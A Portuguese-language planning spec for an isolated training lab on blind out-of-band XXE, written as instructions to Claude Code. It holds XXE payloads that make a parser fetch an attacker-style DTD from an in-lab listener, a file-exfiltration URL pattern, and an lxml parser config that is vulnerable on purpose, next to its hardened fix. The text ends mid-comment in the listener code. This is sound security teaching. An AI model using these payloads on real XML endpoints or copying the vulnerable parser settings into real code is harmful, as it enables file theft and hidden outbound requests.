# Spec — Átomo 30: `xxe-blind-oob`

> Documento de especificação para o Claude Code implementar o átomo `xxe-blind-oob` do projeto `atomicvulns`. É uma **variante do `18 xxe-basic`** (mesma classe — XXE, mesma categoria — A05) mas **CEGA** e confirmada **OUT-OF-BAND (OOB)**: a app parseia XML não-confiável com um parser que resolve entidades externas, **mas NÃO ecoa** o valor da entidade na resposta — então a confirmação sai por um **canal lateral** (a requisição que o parser faz pra um listener que o atacante controla). É **MULTI-CONTAINER** (app `vulnerable` + app `fixed` + um `oob-listener` embarcado que serve a DTD maliciosa e registra o hit), herdando a **topologia OOB do `16 ssrf-blind-oob`**.
>
> **A lição em uma linha:** *ausência de eco NÃO é ausência de vulnerabilidade.* Um parser de XML configurado pra resolver entidades **externas** processa XML não-confiável do atacante; mesmo que a app **não devolva** o valor da entidade na resposta (cego), o atacante força o parser a fazer uma **requisição de saída** pra um servidor que ele controla — e a **chegada dessa requisição prova** que a entidade externa foi resolvida (**XXE confirmado out-of-band**). A causa é a **MESMA** do XXE in-band (`18`): parser com external entities/DTD ligados. O fix é o **MESMO**: desligar external entities/DTD no parser. O que muda é o **CANAL** de confirmação: sem eco, usa-se um canal out-of-band.
>
> **Escopo desta fase (PLANNING):** **só a spec.** Nada de `vulnerable/`, `fixed/`, `oob-listener/`, README, WALKTHROUGH, DIFF, `docker-compose.yml`, Dockerfile, DTD, `requirements.txt` — isso é a **Fase 2**. Nada de commit, merge, ou alteração de convenções (`CLAUDE.md`/`ROADMAP.md`/Makefile/`atom`). Os blocos de código nesta spec são **candidatos** pra guiar a Fase 2 — **não** são os arquivos finais.
>
> Leia junto com `CLAUDE.md` (§3.3 — **Burp-only**, HTML só quando é a prova client-side, o que **não** é o caso aqui; §5 — **abertura seca**, passo "o que a vuln NÃO é" obrigatório, **definir termo na 1ª ocorrência**, **OWASP 2021 sem arqueologia**, **título = classe sem stack**; §7 — idioma + **headers de seção traduzidos em TODA doc PT**; §8 — **bind `127.0.0.1`**, **isolamento**, lab **offline**, nada sai da máquina — **CRÍTICO** pro OOB; §14 + "Memória de projeto" — o Claude Code **não grava memória por conta própria**, propõe no fim), `ROADMAP.md`, e — como **referências vivas** — o **`18 xxe-basic` INTEIRO** (o gêmeo in-band: como a app parseia XML, o parser/config, o payload de entidade, o fix) e o **`16 ssrf-blind-oob` INTEIRO** (o molde de infra OOB: o listener embarcado, as redes do compose, o canal de observação por log, a resposta cega idêntica). O `01 sqli-union-basic` serve pelo molde canônico de doc.

---

## Nota de planning 1 — posição (ver `ROADMAP.md`) e REAPROVEITAMENTO da categoria A05 (já existe)

> **Confirmado contra o `ROADMAP.md` (fonte da verdade; `CLAUDE.md` §9/§10.5).** O `ROADMAP.md` lista **`30. xxe-blind-oob — A05 Security Misconfiguration`** com a justificativa (não-foreshadow) *"XXE sem resposta direta, via out-of-band"* e a etiqueta *"Variante do 18"*. O **número sequencial é 30** — é a base das portas (`8030`/`8130`, `CLAUDE.md` §5) e do prefixo de commit/CHANGELOG.
>
> **A categoria A05 JÁ EXISTE — REAPROVEITAR, não criar.** A pasta `atoms/A05-security-misconfiguration/` foi criada pelo `18 xxe-basic` e **já hospeda** aquele átomo. O `30` mora **ao lado** dele: `atoms/A05-security-misconfiguration/xxe-blind-oob/`. **NÃO** recriar a pasta de categoria; **NÃO** mexer no `18`.
>
> **Esta spec nasce FORESHADOW-CLEAN (regra redobrada — ver Nota de planning 2).** A spec vai pro repo público (é commitada). Por isso ela **NÃO** situa o átomo por ordinal de fase, milestone/release, nem como abertura/encerramento de nada — **a posição vive SÓ no `ROADMAP.md`**. Confirmo aqui apenas o **número (30)**, o **slug (`xxe-blind-oob`)** e a **categoria (A05)**, que são metadados operacionais (portas, pasta, commit) — não posicionamento narrativo.

## Nota de planning 2 — versionamento/release fica FORA desta spec + FORESHADOW REDOBRADO

> **Versionamento/CHANGELOG/tag/anúncio é trabalho de release do mantenedor**, não de átomo (`CLAUDE.md` §10.4) — não entra nesta spec nem no conteúdo do átomo. A única pegada de changelog é **uma linha em `[Unreleased] / Added`** na Fase 2 (ver "Notas específicas pro Claude Code").
>
> **FORESHADOW REDOBRADO (o ponto mais sensível desta spec).** **PROIBIDO**, tanto no **conteúdo do átomo** quanto **na própria spec** (que é pública/commitada): "último átomo", "fecha a fase", "conclui a fase", "próxima fase", "penúltimo/último", qualquer release/versão (`v0.x` etc.), ou **qualquer texto que situe o átomo como encerramento**. Nas frases que proíbem foreshadow, manter a proibição **GENÉRICA** — **sem nomear átomos não publicados**. O átomo se descreve **ISOLADO**. **Pode citar `18`, `16` e `01`** (publicados) à vontade (`CLAUDE.md` §5).

## Nota de planning 3 — convenções ATUAIS: Burp-only, abertura seca, API-only, título=classe, sem arqueologia

> Seguir o `CLAUDE.md` **atual** — **NÃO** copiar estilo antigo onde divergir (o `18` e o `16`, escritos antes, usam **trilha dupla Burp+browser** e o `18` traz **arqueologia OWASP "era A4 em 2017"**; ambos os hábitos estão **superados**). Decisões de forma:
>
> - **Burp-only — SEM trilha browser** (`CLAUDE.md` §3.3/§5). O vetor é um **documento XML no corpo da request** (Repeater); a **prova** é o **hit no log do listener** (`docker compose logs oob-listener`). **NÃO há execução client-side** (o browser **não** é a prova — não é a exceção client-side do XSS/DOM). Trilha 100% **Burp (Repeater) + `docker compose logs`**, `curl` como equivalente. Mesma trilha efetiva do `16` (que, apesar do header antigo "trilha dupla" no spec, é Burp+logs no átomo publicado).
> - **API-only JSON — DECISÃO DE FORMA (recomendada; confirmável na Fase 2).** Recomendo **API-only, sem HTML**: um `POST` que recebe o **XML cru no corpo** (`Content-Type: application/xml`, `request.data`) e devolve um **ack genérico JSON** (`{"status": "received"}`). Motivos: (1) a **prova** é o hit OOB no log, **não** uma página renderizada — HTML só "contextualizaria"; (2) o payload de blind XXE é um **XML multi-linha com DOCTYPE/entidades** — mandá-lo como **corpo cru** é muito mais limpo no Repeater do que o campo de form `x-www-form-urlencoded` do `18` (que precisou ensinar a encodar `&`→`%26`); é o mesmo ganho didático que o `29` teve ao pôr o payload literal em JSON. **Alternativa (flip localizado, se o mantenedor preferir o molde do `18`):** um HTML mínimo com `<textarea>` — trocar `request.data` por `request.form["xml"]` + um `index.html` de ~20 linhas. **Registrar como confirmável, não bloqueante.**
> - **Abertura seca (`CLAUDE.md` §5).** O WALKTHROUGH abre **direto na mecânica** — a 1ª frase situa a feature (um endpoint que parseia XML e responde um ack mudo) e a falha (o parser resolve entidades externas e telefona pra fora). **NADA** de encenação ("você é o pentester" e afins).
> - **Definir termo técnico na 1ª ocorrência (`CLAUDE.md` §5).** XML, DTD (Document Type Definition), entidade, entidade **externa** (`SYSTEM`, aponta pra `file://` ou URL), **parameter entity** (`%`-entity, usada dentro da DTD), **DTD externa**, **in-band** (valor volta na resposta) vs **out-of-band/OOB** (prova sai por um canal lateral), **listener**/sink OOB — dar a expansão/definição na estreia. O átomo assume que o aluno **pode não ter feito o `18`**: define o vocabulário XXE do zero (pode apontar pro `18` pra ver a versão in-band, mas se explica sozinho).
> - **Título = classe sem stack (`CLAUDE.md` §5).** O H1 nomeia a **classe** ("Blind XXE (out-of-band)"), **NÃO** o motor ("...em lxml"/"...em Flask"). O slug (`xxe-blind-oob`) já qualifica a variante; nenhum "lxml"/"Flask" no H1. O motor aparece no **corpo**.
> - **Headers de seção traduzidos em TODA doc PT (`CLAUDE.md` §7).** README/WALKTHROUGH/DIFF em `.pt-BR.md` traduzem **TODOS** os headers (`##`/`###`), com os termos técnicos em inglês dentro do header traduzido (ex.: `## Por que o fix funciona`, `### Passo 1 — Ver o canal in-band mudo`). A **única** exceção é o **H1 do README** (idêntico ao EN). Sinal de erro: header PT byte-idêntico ao par EN.
> - **A05 sem arqueologia** (Nota de planning 4). **NÃO** repetir a nota "XXE era A4 em 2017" que o `18` traz — é arqueologia proibida pela convenção atual.

## Nota de planning 4 — MULTI-CONTAINER (molde do `16`), volta pro Flask, e por que A05 sem arqueologia

> **MULTI-CONTAINER — molde do `16 ssrf-blind-oob`.** Diferente do gêmeo `18` (que é **single-container**, só `vulnerable`+`fixed`, porque é in-band e não precisa de canal externo), o `30` é **cego** e precisa de um **canal OOB** — então **embarca um `oob-listener`** exatamente como o `16`. Três serviços sob um `docker-compose.yml`: `vulnerable`, `fixed`, `oob-listener`. **A infra OOB do `30` SAI do `16`** (topologia de redes, listener sem porta no host, observação por `docker compose logs`). Ver "Wiring do listener".
>
> **Volta pro Flask + lxml.** Stack Python/Flask + `lxml` (o mesmo parser do `18`, pinado — o comportamento de resolução de entidade é **behavior-critical**, `CLAUDE.md` §8.7). O listener é Flask trivial (molde do `16`).
>
> **Por que A05 (Security Misconfiguration), sem arqueologia.** A causa-raiz é um **parser configurado pra resolver entidades externas/DTD** — uma **misconfiguration** do componente de parsing, não um bug de lógica. É a **mesma** razão do `18`. No Top 10 **2021** (a edição que o projeto segue, `CLAUDE.md` §4), XXE vive em **A05 — Security Misconfiguration**. **Nomear a categoria vigente e parar aí** — **NÃO** relatar em que número XXE caía em edições antigas (arqueologia proibida, `CLAUDE.md` §5 atual).

---

## Identidade

- **ID:** `xxe-blind-oob`
- **Categoria OWASP (pasta / Web Top 10 2021):** **A05 — Security Misconfiguration**. Pasta `atoms/A05-security-misconfiguration/` (**JÁ EXISTE — criada pelo `18`; o `30` reaproveita**). Em prosa (README/DIFF/WALKTHROUGH) usar o nome da classe — **"Blind XXE"** / **"out-of-band XXE"** — e a categoria **"A05 — Security Misconfiguration"**, **sem arqueologia de edições**.
- **Pasta:** `atoms/A05-security-misconfiguration/xxe-blind-oob/`
- **Número sequencial:** 30
- **Porta `vulnerable`:** `127.0.0.1:8030`
- **Porta `fixed`:** `127.0.0.1:8130`
- **`oob-listener`:** **sem porta publicada no host** — reachable **só** de dentro das redes do compose (hostname `oob-listener`), observado por `docker compose logs oob-listener`. Molde exato do `16`. (Confirmar na Fase 2 seguindo o `16`: o listener **não** tem `ports:`.)
- **Bind:** **somente** `127.0.0.1` no `docker-compose.yml` para `vulnerable` e `fixed` (`CLAUDE.md` §8.1). Containers rodam com `ENV HOST=0.0.0.0` interno (pro forwarding do Docker / a rede interna alcançar o Flask); exposição host restrita a `127.0.0.1` pelo compose — mesmo padrão do `16`.
- **Topologia:** **MULTI-CONTAINER** — `vulnerable` + `fixed` + `oob-listener`. Redes separadas `lab-vulnerable`/`lab-fixed`, listener nas **duas**. Molde do `16` (ver "Wiring do listener").
- **Fase / milestone:** ver `ROADMAP.md`. Versionamento/release **fora desta spec** (Nota de planning 2). **No conteúdo do átomo (e nesta spec pública): ZERO menção de posição/ordinal de fase/release/próximos átomos/encerramento** (§5 foreshadow, redobrado).
- **Branch de trabalho:** `atom/xxe-blind-oob`. Convenção `atom/<id>` (`CLAUDE.md` §6). **Branch já criada nesta fase de planning.**
- **Theory primer (registrar candidato, confirmar por fetch na Fase 2):** página **conceitual de XXE** na PortSwigger Web Security Academy — **framing "what is X?"**, **NÃO** a listagem de labs. Candidato: **`https://portswigger.net/web-security/xxe`** (a mesma página-classe que o `18` usa; ela **cobre uma seção de "Blind XXE"**). **Se houver âncora estável da seção blind (candidato a confirmar por fetch: `#blind-xxe` ou similar), linkar direto nela**; senão, a página-classe `.../xxe`. *(Paralelo: o `16` conseguiu uma página blind-específica dedicada — `/web-security/ssrf/blind` — para SSRF; para XXE a PortSwigger tipicamente mantém a variante blind como **seção** da página-classe, não como página separada. Confirmar por fetch.)* **NÃO inventar URL — confirmar por fetch na Fase 2**; se não confirmar, perguntar ao mantenedor.
- **H1 dos READMEs (idêntico em EN e PT, `CLAUDE.md` §7 e §5 título=classe):** candidato **`# xxe-blind-oob — Blind XXE (out-of-band)`** — `id` + nome canônico da **classe** em inglês, **paralelo direto** ao H1 do `16` (`ssrf-blind-oob — Blind SSRF (out-of-band)`). **SEM** "lxml"/"Flask" no H1. *(Alternativa registrada: `Blind (out-of-band) XXE`. A grafia canônica exata — ordem de "out-of-band" e casing de "XXE" — **confirmável na Fase 2** casando com o título/seção da página PortSwigger; preservar o nome em **inglês** também no README PT.)*

---

## Classe de vulnerabilidade

**Blind (out-of-band) XXE.** Uma app web tem um endpoint que **recebe um documento XML e o parseia** com um parser (`lxml`) que **resolve entidades externas** — mas **NÃO devolve** o valor da entidade na resposta (a resposta é um **ack genérico**, mudo). Por causa da resolução de entidade externa, um documento cujo `DOCTYPE` declara uma entidade externa apontando pra um servidor do atacante faz o parser **buscar** esse recurso — uma **requisição de saída** pra um destino que o atacante escolheu. Como a app é **cega** (não ecoa nada), a confirmação vem **out-of-band**: o atacante aponta a entidade pra um **listener** que ele controla e **observa o callback chegar**. **Sem eco, a resposta é muda — mas o parser "telefona pra casa", e o telefonema é a prova.**

### A lição-coração

> **"Ausência de eco NÃO é ausência de vulnerabilidade. Um parser de XML configurado pra resolver entidades EXTERNAS processa XML não-confiável do atacante; mesmo que a app NÃO devolva o valor da entidade na resposta (cego), o atacante força o parser a fazer uma REQUISIÇÃO DE SAÍDA pra um servidor que ele controla — e a chegada dessa requisição prova que a entidade externa foi resolvida (XXE confirmado out-of-band). A causa é a MESMA do XXE in-band (parser com external entities/DTD ligados); o fix é o MESMO (desligar external entities/DTD no parser). O que muda é o CANAL de confirmação/exfiltração: sem eco, usa-se um canal out-of-band."**

### O MECANISMO em detalhe (o coração do WALKTHROUGH)

Definir cada peça na estreia (o aluno pode não ter feito o `18`):

- **XML** carrega uma **DTD (Document Type Definition)** — um preâmbulo opcional que, entre outras coisas, deixa o documento **declarar entidades**: atalhos nomeados que o parser expande, como variáveis.
- Uma entidade pode ser **externa** (`SYSTEM`), apontando pra uma URI — um arquivo local (`file:///etc/passwd`) **ou uma URL** (`http://atacante/...`). Se o parser **resolve** entidades externas, ele **busca** o que a URI aponta.
- **Parameter entity** (`%`-entity) é uma entidade usada **dentro da própria DTD** (não no corpo do documento). É a peça que a técnica OOB canônica usa, porque parameter entities são processadas **durante o parse da DTD**, independentemente de o corpo do documento ecoar algo.
- **A técnica OOB canônica (blind XXE):** o payload declara uma **parameter entity externa** que busca uma **DTD no servidor do atacante**; essa DTD, por sua vez, monta (via mais parameter entities) uma segunda entidade que **embute conteúdo de um arquivo local numa URL** e **dispara uma requisição** pro listener. **A busca da DTD externa já é, por si só, um callback OOB** — o parser saiu pra rede, pro destino do atacante. Esse callback é a **prova mínima e sólida** de blind XXE.

O ponto contraintuitivo a cravar: **não há bug de lógica na app; o bug é a CONFIG do parser** (resolver entidade externa + alcançar a rede). E **não há eco**: a resposta não muda entre um XML benigno e o payload — a diferença só aparece **no log do listener**.

### Sub-lição CRÍTICA (o coração do passo "o que a vuln NÃO é" e da nota #2 do DIFF)

> **A defesa NÃO é "não devolver o valor na resposta" / "esconder o eco".** A app **já** não ecoa — e mesmo assim é vulnerável, porque a vuln **não depende de eco**. O parser continua resolvendo entidades externas e telefonando pra fora. **A defesa é DESLIGAR external entities/DTD no parser.** Esta é a intuição-armadilha de quem viu o `18` ("o problema era o valor voltar na resposta, então é só não devolver") — e é **falsa**. O fix é no **PARSER**, não na resposta.

### Por que A05 (Security Misconfiguration)

A causa-raiz é um **parser configurado pra resolver entidades externas/DTD** (e alcançar a rede) em XML não-confiável — uma **misconfiguration** do componente de parsing, **idêntica** à do `18`. Por isso A05, no Top 10 2021. (Sem arqueologia — `CLAUDE.md` §5.)

---

## Contraste com o `18 xxe-basic` — CENTRAL (é a razão de o átomo existir)

**Cravar no WALKTHROUGH e no DIFF (tabela + prosa).** Ambos são **A05**, ambos **XXE**, com a **MESMA causa** (parser resolve external entities/DTD) e o **MESMO fix** (desligar isso no parser). **O que difere e justifica dois átomos é o CANAL:**

- No **`18`**, a app **ECOA** o valor da entidade na resposta → exfiltração **in-band**: você lê o `/etc/passwd` **na tela**.
- No **`30`**, a app **NÃO ecoa** (cego) → a confirmação/exfiltração é **out-of-band**, via a requisição que o parser faz pro listener.

Enquadrar **EXPLÍCITO**: *in-band = o valor volta na resposta; blind/OOB = a resposta é muda, mas o parser "telefona pra casa" e o telefonema é a prova.* **"Um átomo = uma vuln"** é a **CAUSA** (parser com external entities ligadas); o **objeto de estudo do `30`** é a **confirmação OOB do XXE cego** (o canal), não uma classe nova.

### Tabela candidata (cravar no DIFF e no WALKTHROUGH)

| Eixo | `18 xxe-basic` (in-band) | `30 xxe-blind-oob` (blind/OOB) |
|---|---|---|
| Categoria | A05 — Security Misconfiguration | A05 — Security Misconfiguration (**a mesma**) |
| Causa | parser resolve external entities/DTD | **a MESMA** |
| Canal | **in-band** — o valor volta na resposta | **out-of-band** — requisição do parser pro listener |
| O que o aluno observa | o arquivo **na resposta HTTP** | o **hit chegando no listener** (`docker compose logs`) |
| Fix | desligar external entities/DTD no parser | **o MESMO** |

**Linhas-bônus (honestas e ilustrativas — opcionais na tabela do DIFF):**

| Eixo | `18` | `30` |
|---|---|---|
| Rede no parser | `no_network=True` (só `file://`, leitura local) | `no_network=False` (o parser **alcança a rede**) |
| Resposta da app | **ECOA** o campo parseado | **muda** (ack genérico, sem eco) |
| Forma do payload | entidade geral `SYSTEM "file://…"`, ecoada num campo | **parameter entity → DTD externa** via `http://…` |

> **A dobradiça técnica precisa (cravar):** a **única** diferença de *config do parser* entre o vulnerable do `18` e o do `30` é o flag **`no_network`**. O `18` mantém `no_network=True` → a entidade resolve só `file://` (leitura de arquivo local, ecoada in-band). O `30` flipa `no_network=False` → o parser **sai pra rede**, e como a app é cega, a prova vira o callback OOB. **Mesma causa (resolver external entities/DTD), mesmo fix (desligar); o canal muda porque o parser passa a alcançar a rede e a app não ecoa.** Isso mantém "um átomo = uma vuln" (a causa é uma só) e explica limpo por que são dois átomos (o canal é o objeto de estudo).

---

## Relação com o `16 ssrf-blind-oob` — molde de INFRAESTRUTURA OOB

O `16` é o **parente de infraestrutura**: mesma pergunta — *"como confirmar algo que não tem eco?"* — mesma resposta — *"canal out-of-band + listener embarcado"*. **Herdar do `16`:**

- A **topologia do listener embarcado** (um `oob-listener` interno, análogo self-hosted do Burp Collaborator/`interactsh`, porque o lab é isolado e **não pode depender de um serviço externo de terceiros**).
- Como o listener **registra o hit** (`app.logger.info("OOB HIT path=/... from=...")`) e **como o aluno observa** (`docker compose logs oob-listener`, **sem** porta no host).
- A **topologia de redes** (`vulnerable`→`lab-vulnerable`, `fixed`→`lab-fixed`, `oob-listener` nas **duas**), que torna a **ausência de hit no fixed atribuível ao CÓDIGO, não à rede** (o listener é alcançável pela rede dos dois lados; o fixed simplesmente não dispara).
- A **resposta cega idêntica** vulnerable↔fixed (o fix não mexe na resposta) e a lição *"blind não é ausência"*.

**A DIFERENÇA honesta a cravar (para o `30` não virar "outro `16`"):** no `16`, quem faz a requisição de saída é a **APP** (é SSRF — a app é induzida a requisitar, `requests.get(url)`). No `30`, quem faz a requisição é o **PARSER XML** resolvendo a entidade externa — a app **nunca "quis" fazer request de rede nenhuma**; o request é uma **capacidade escondida do parser**, não uma feature da app. **Mesma família de CONFIRMAÇÃO (OOB), causa/vetor diferentes (SSRF vs XXE).** Um corolário honesto a registrar: o callback do `30` é, na forma, uma requisição HTTP de saída pra um destino do atacante (tem **cara** de SSRF — "SSRF via XXE"), mas a **classe** é XXE (parser resolvendo entidade externa) e o **fix** é o de XXE (desligar entidades/DTD) — por isso o átomo é **A05**, não A10, e **não pisa no arco SSRF**. Citar o `16` à vontade (publicado).

---

## Flavor — endpoint que parseia XML e NÃO ecoa (TRAVADO)

**TRAVADO:** um endpoint `POST` que recebe um **documento XML** no corpo, **parseia** com um parser que resolve entidades externas, e **faz algo com o resultado SEM devolver o valor da entidade na resposta** (cego). A resposta é **genérica** (candidato: `{"status": "received"}`, `200`) — o aluno vê que **NÃO há eco**. O ataque: enviar um XML cujo payload declara a entidade externa que puxa a DTD do listener e dispara a requisição OOB.

**VOCÊ DECIDE / CONFIRME NA FASE 2 — a forma exata do endpoint e do "algo que a app faz com o XML":** manter **UMA** superfície (o parse do XML não-confiável) e a resposta **comprovadamente MUDA**. Candidato recomendado: um **endpoint de "importação em lote" (bulk import)** — a app recebe um lote XML, "importa"/processa, e responde só um **ack de recebimento** (sem ecoar conteúdo). É um motivo plausível e cotidiano de parsear XML no servidor, e o ack mudo cai natural (um import assíncrono que confirma o recebimento). **Dados fake.**

- **Endpoint candidato:** `POST /import` — `request.data` (corpo XML cru, `Content-Type: application/xml`) → `etree.fromstring(request.data, parser)` → `return jsonify(status="received")`.
- **A resposta é IDÊNTICA nos dois lados** (vulnerable e fixed) — o fix endurece o **parser**, não a resposta (molde do `16`, cuja resposta `"Test ping sent."` é intocada pelo fix).
- **Sem HTML por default** (API-only recomendado — Nota de planning 3). **Alternativa registrada:** molde do `18` com `<textarea>` (flip localizado).

---

## O ataque (blind, OOB) + a prova

Dois tempos, no Repeater (trilha Burp) + `docker compose logs` (a prova):

- **Tempo 1 — ver o canal in-band MUDO (passo pedagógico OBRIGATÓRIO).** Enviar ao endpoint um **XML benigno normal** (sem DOCTYPE/entidade) → **resposta genérica** (`{"status": "received"}`), **nada vaza**, **nenhum hit** no listener. O aluno **VÊ que a resposta é muda** — o canal in-band não diz nada. **Este passo é central, não detalhe:** se o aluno não perceber que o in-band está mudo, o "pra que serve o OOB" não faz sentido, e o átomo perde a razão de existir separado do `18`.
- **Tempo 2 — disparar o payload e confirmar OOB.** Enviar o **XML-payload** (entidade externa apontando pra DTD no `oob-listener`) → a resposta **continua muda** (idêntica ao Tempo 1), **MAS** `docker compose logs oob-listener` mostra o **hit** → **XXE confirmado out-of-band**.
  - **VULNERABLE:** parser resolve a entidade externa e busca a DTD → **faz a requisição OOB** → hit no log.
  - **FIXED:** parser com external entities/DTD desligados → **nenhuma requisição** chega ao listener → **sem hit** (resposta idêntica à do vulnerable; a diferença só existe no log).

### DECISÃO-ABERTA / CONFIRME NA FASE 2 (probe — NÃO travar; registrar candidato + "proponha o que funcionar")

Estes três itens **NÃO** estão travados. São **probes**: a Fase 2 **roda** e escolhe o que reproduz; **se a config candidata não reproduzir, registrar honestamente e usar a que reproduz — NÃO inventar; se NADA reproduzir, PARAR e avisar o mantenedor.**

**(1) PARSER + CONFIG exatos que reproduzem o OOB (o item central — version-dependent).**
Candidato: **`lxml`** (como o `18`) com **`etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=False)`** — a diferença do `18` é **`no_network=False`** (o `18` usa `True`), pra o parser **alcançar a rede** e buscar a DTD externa.
- **CRÍTICO / version-dependent:** as defaults de segurança do `lxml`/`libxml2` mudaram entre versões (`no_network` default, `resolve_entities`, e o tratamento de **parameter entities** e **DTD externa**). `libxml2` tem restrições conhecidas: parameter entities **não** são permitidas no **subset interno** em certas posições (por isso a técnica usa **DTD externa**), e o suporte ao truque de **parameter entity aninhada** é **finicky/version-dependent**.
- **Confirmar RODANDO** qual parser/versão/config faz o `lxml` **buscar a DTD externa e disparar a requisição OOB**. **Pinar a versão.**
- **Candidatos de payload (probe escolhe):**
  - **Candidato A (canônico blind XXE — primário):** parameter entity no subset interno referenciando a DTD externa, o que **força o fetch** da DTD:
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE import [
      <!ENTITY % ext SYSTEM "http://oob-listener/proof-xxe-30.dtd">
      %ext;
    ]>
    <import><item>test</item></import>
    ```
    O `%ext;` força o parser a buscar `http://oob-listener/proof-xxe-30.dtd` → **HIT** (a prova mínima).
  - **Candidato B (fallback — mais simples):** entidade **geral** externa sobre `http://`, referenciada no corpo:
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE import [ <!ENTITY x SYSTEM "http://oob-listener/proof-xxe-30"> ]>
    <import><item>&x;</item></import>
    ```
    Mesmo sendo cega (o `&x;` nunca é ecoado), o **fetch** de `http://oob-listener/proof-xxe-30` acontece **durante o parse** → HIT. Fallback se o Candidato A esbarrar em restrições de parameter-entity-no-subset-interno do `libxml2`.
- **Path fixo reconhecível** pra atribuição causal (molde do `16`, que usou `/proof-ssrf-16`): candidato **`/proof-xxe-30`** (e **`/proof-xxe-30.dtd`** para a DTD). **Sem nonce dinâmico** — o lab isolado não tem concorrência de payloads.

**(2) O QUE A PROVA REALMENTE DEMONSTRA (honestidade técnica — TRAVADO no piso, aberto no teto).**
- **PISO (TRAVADO — a prova que o átomo crava):** o **HIT no listener** (o parser resolveu a entidade externa e buscou a DTD → fez a requisição OOB) é a prova **MÍNIMA e SÓLIDA** de blind XXE. É o que o átomo garante.
- **TETO (probe-dependent — a exfiltração de conteúdo de arquivo):** a técnica canônica de exfil (a DTD externa monta, via parameter entities aninhadas, uma 2ª entidade que embute `file://` numa URL: `http://oob-listener/proof-xxe-30?x=%file;`) tem **limitações reais** com `libxml2`: quebras de linha, `>`, `&`, `%` no conteúdo do arquivo **quebram** a técnica; o suporte do `libxml2` ao truque de parameter entity aninhada é **finicky/version-dependent**. **VOCÊ DECIDE / CONFIRME NA FASE 2:** se dá pra exfiltrar um arquivo de **conteúdo simples/controlado** (single-line, URL-safe) pela URL **sem esbarrar nisso**, o átomo **mostra a exfiltração**; **senão, prova pelo HIT** (e opcionalmente embute na URL um **dado controlado simples** — ex.: um marcador — pra mostrar que o canal **carrega dado**). **NÃO prometer "vaza `/etc/passwd` inteiro"** se o probe não confirmar. **Registrar o que o probe mostrar.**
  - *Arquivo-alvo condicional (só se o teto reproduzir):* plantar um `/app/secret.txt` **dummy single-line URL-safe** (candidato: `FLAG-xxe30-9f1c2a-EXAMPLE-not-a-real-secret`, valor **obviamente falso**, `CLAUDE.md` §8) **nas duas** imagens de app — assim, **se** a exfil reproduzir, há um arquivo próprio da app pra carregar, e a ausência no fixed é do **parser**, não do arquivo faltar. Se só o piso reproduzir, o arquivo é inócuo/não-usado. **O `secret` a exfiltrar mora na app; o listener continua tripwire (sem segredo).**

**(3) TOPOLOGIA DO LISTENER (molde do `16`; confirmar na Fase 2).**
Um container `oob-listener` que **serve a DTD maliciosa** (rota que devolve o corpo da DTD quando o parser busca `…/proof-xxe-30.dtd`) **E registra o hit** (catch-all que loga toda request). Provável **mesmo serviço** (uma rota serve a DTD; o catch-all loga). O aluno **observa** o hit por **`docker compose logs oob-listener`** (molde do `16`); o listener **não publica porta no host**. Confirmar seguindo o `16`.
- *Conteúdo da DTD servida:* se só o **piso** (fetch), a DTD pode ser trivial/inócua — **o fetch é a prova**. Se o **teto** (exfil) reproduzir, a DTD é a que monta a 2ª entidade de exfil. **A Fase 2 decide qual, conforme o probe (item 2).**

---

## Prova — BENIGNA E OBSERVÁVEL (`CLAUDE.md` §8)

A prova é o **HIT no listener embarcado** (a requisição OOB chegando), **NÃO** um dump destrutivo, **sem RCE**. Cadeia:

- **Baseline:** XML normal → resposta muda, **nenhum hit**.
- **Payload (vulnerable):** resposta muda, **MAS o hit chega** no listener.
- **Payload (fixed):** o **MESMO** payload → **NENHUM hit**.

Tudo **offline**, `127.0.0.1`, containers descartáveis; **o listener é do próprio lab** (análogo self-hosted do Collaborator). **NADA sai da máquina** — **CRÍTICO (`CLAUDE.md` §8):** o OOB **não pode** virar "requisição pra internet"; o destino do callback é **interno/local** (`http://oob-listener/…`, hostname da rede do compose), nunca um host público. **Não overclamar.**

---

## O código — o coração no PARSER (candidatos; a Fase 2 gera o real)

Fio condutor: **o parse do XML**. Imports (vulnerable e fixed compartilham; a divergência é só a config do parser):

```python
import os
from lxml import etree
from flask import Flask, request, jsonify
```

### `vulnerable/app.py` — parser resolve entidade externa + alcança a rede, resposta muda (candidato)

```python
app = Flask(__name__)


@app.route("/import", methods=["POST"])
def import_batch():
    xml = request.data  # raw XML body (Content-Type: application/xml)
    # VULNERABLE: parse untrusted XML with a parser that RESOLVES EXTERNAL ENTITIES and DTDs and
    # is allowed to reach the NETWORK (no_network=False). A DOCTYPE that declares an external
    # parameter entity pointing at an attacker-hosted DTD makes the parser FETCH that DTD -- an
    # outbound request to a destination the attacker chose. Nothing about the entity is echoed:
    # the response below is a generic ack. The XXE is real, it is merely BLIND, so it is
    # confirmed out-of-band (see the oob-listener service). The bug is this parser config, not
    # the import logic. Same cause as xxe-basic (18); the only parser-config delta is
    # no_network=False -- that single flag lets the parser reach the network for the OOB channel.
    parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=False)  # dangerous
    try:
        etree.fromstring(xml, parser)  # parsing itself resolves the external entity -> OOB fetch
    except etree.XMLSyntaxError:
        pass  # swallow: surfacing the parse error would leak an in-band oracle
    return jsonify(status="received")  # generic: says nothing about what the parser resolved
```

### `fixed/app.py` — external entities/DTD DESLIGADOS, resposta IDÊNTICA (candidato)

```python
app = Flask(__name__)


@app.route("/import", methods=["POST"])
def import_batch():
    xml = request.data
    # FIXED: parse with external-entity resolution and DTD loading DISABLED, network off. The
    # external parameter entity is never resolved, so the attacker DTD is never fetched -- no
    # outbound request, no OOB callback. Canonical XXE defense for an lxml app: turn off the
    # dangerous parser features. (defusedxml's lxml support is deprecated; hardening the parser
    # directly is the current advice.) The load-bearing change is resolve_entities/load_dtd off;
    # no_network=True is belt-and-suspenders. The response is byte-identical to the vulnerable
    # version on purpose: the fix hardens the PARSER, never the response.
    parser = etree.XMLParser(resolve_entities=False, load_dtd=False, no_network=True)  # hardened
    try:
        etree.fromstring(xml, parser)
    except etree.XMLSyntaxError:
        pass
    return jsonify(status="received")
```

### `oob-listener/app.py` — serve a DTD + loga o hit (candidato; molde do `16`)

```python
import os
import logging
from flask import Flask, request, Response

logging.basicConfig(level=logging.INFO)  # ensure INFO lines reach docker compose logs
app = Flask(__name__)

# The attacker-hosted external DTD. The vulnerable parser fetches it while resolving the external
# parameter entity -- that fetch is the OOB proof. Phase 2 sets the body: a trivial DTD (floor:
# the fetch alone proves blind XXE) or an exfil-constructing DTD (ceiling: carry a controlled
